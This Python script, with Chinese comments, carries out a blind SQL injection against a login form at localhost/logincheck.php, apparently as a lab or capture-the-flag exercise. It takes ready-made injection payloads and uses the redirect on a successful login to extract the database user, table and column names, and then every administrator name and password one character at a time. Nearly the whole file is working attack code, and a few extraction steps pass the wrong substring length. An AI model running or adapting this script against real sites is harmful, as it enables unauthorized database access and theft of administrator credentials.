from urllib.parse import quote, urlencode
import requests


def encode_url(s: str):
    uri = []
    byte_s = s.encode('utf-8')
    for e in byte_s:
        uri.append('%' + hex(e).replace('0x', '').zfill(2))
    return ''.join(uri)


base = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_/'
url = 'http://localhost/logincheck.php'

#猜测用户名长度
user_len = 0
for l in range(1, 20):
    payload = "1' or (select length(user) from dual)={}--".format(l)
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if 'movies.php' in res.url:
        user_len = l
        print('user length: ', l)
        break

#猜测用户名
user_name = ''
for i in range(1, user_len + 1):
    for c in base:
        payload = "1' or (select ascii(substr(user,{},{})) from dual)={}--".format(
            i, 1, ord(c))
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if 'movies.php' in res.url:
            user_name += c
            print(user_name)
            break
print('user name: ', user_name)

#猜测表数量
table_numbers = 0
for l in range(1, 20):
    payload = "1' or (select count(table_name) from user_tables)={}--".format(
        l)
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if 'movies.php' in res.url:
        table_numbers = l
        print('table numbers: ', l)
        break

#猜测表长度
table_len = []
for i in range(0, table_numbers):
    for l in range(1, 20):
        payload = "1' or (select length(table_name) from (select t.table_name, rownum rn from user_tables t) nn where nn.rn >{} and nn.rn <={})={}--".format(
            i, i + 1, l)
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if 'movies.php' in res.url:
            table_len.append(l)
            print('table length: ', l)
            break

#猜测表名
table_name = []
for i in range(0, table_numbers):
    t_name = ''
    for l in range(1, table_len[i] + 1):
        for c in base:
            payload = "1' or (select ascii(substr((table_name),{},{})) from (select t.table_name, rownum rn from user_tables t) nn where nn.rn >{} and nn.rn <={})={}--".format(
                l, 1, i, i + 1, ord(c))
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if 'movies.php' in res.url:
                t_name += c
                break
    table_name.append(t_name)
    print(t_name)

#猜测列数量
column_numbers = 0
for l in range(1, 20):
    payload = "1' or (select count(column_name) from user_tab_columns where table_name='ADMIN_USERS')={}--".format(
        l)
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if 'movies.php' in res.url:
        column_numbers = l
        print('column numbers: ', l)
        break

# 猜测列长度
column_len = []
for i in range(0, column_numbers):
    for l in range(1, 20):
        payload = "1' or (select length(column_name) from (select t.column_name, rownum rn from user_tab_columns t where table_name='ADMIN_USERS') nn where nn.rn >{} and nn.rn <={})={}--".format(
            i, i + 1, l)
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if 'movies.php' in res.url:
            column_len.append(l)
            print('column length: ', l)
            break

#猜测列名
column_name = []
for i in range(0, column_numbers):
    c_name = ''
    for l in range(1, column_len[i] + 1):
        for c in base:
            payload = "1' or (select ascii(substr(column_name,{},{})) from (select t.column_name, rownum rn from user_tab_columns t where table_name='ADMIN_USERS') nn where nn.rn >{} and nn.rn <={})={}--".format(
                l, l, i, i + 1, ord(c))
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if 'movies.php' in res.url:
                c_name += c
                break
    column_name.append(c_name)
    print(c_name)

#猜测ADMIN_NAME个数
numbers = 0
for l in range(1, 20):
    payload = "1' or (select count(admin_name) from admin_users)={}--".format(
        l)
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if 'movies.php' in res.url:
        numbers = l
        print('numbers: ', l)
        break

# 猜测ADMIN_NAME每项长度
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' or (select length(admin_name) from (select t.admin_name, rownum rn from admin_users t) nn where nn.rn >{} and nn.rn <={}) ={}--".format(
            i, i + 1, l)
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if 'movies.php' in res.url:
            len.append(l)
            print('length: ', l)
            break

#猜测ADMIN_USER每项的值
user_name = []
for i in range(0, numbers):
    name = ''
    for l in range(1, len[i] + 1):
        for c in base:
            payload = "1' or (select ascii(substr(admin_name,{},{})) from (select t.admin_name, rownum rn from admin_users t) nn where nn.rn >{} and nn.rn <={})={}--".format(
                l, l, i, i + 1, ord(c))
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if 'movies.php' in res.url:
                name += c
                break
    user_name.append(name)
    print('admin_user: ', name)

#猜测ADMIN_PASSWORD个数
for l in range(1, 20):
    payload = "1' or (select count(admin_password) from admin_users)={}--".format(
        l)
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if 'movies.php' in res.url:
        numbers = l
        print('numbers: ', l)
        break

# 猜测ADMIN_PASSWORD每项长度
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' or (select length(admin_password) from (select t.admin_password, rownum rn from admin_users t) nn where nn.rn >{} and nn.rn <={}) ={}--".format(
            i, i + 1, l)
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if 'movies.php' in res.url:
            len.append(l)
            print('length: ', l)
            break

#猜测ADMIN_PASSWORED每项的值
user_password = []
for i in range(0, numbers):
    name = ''
    for l in range(1, len[i] + 1):
        for c in base:
            payload = "1' or (select ascii(substr(admin_password,{},{})) from (select t.admin_password, rownum rn from admin_users t) nn where nn.rn >{} and nn.rn <={})={}--".format(
                l, l, i, i + 1, ord(c))
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if 'movies.php' in res.url:
                name += c
                break
    user_password.append(name)
    print('admin_password: ', name)
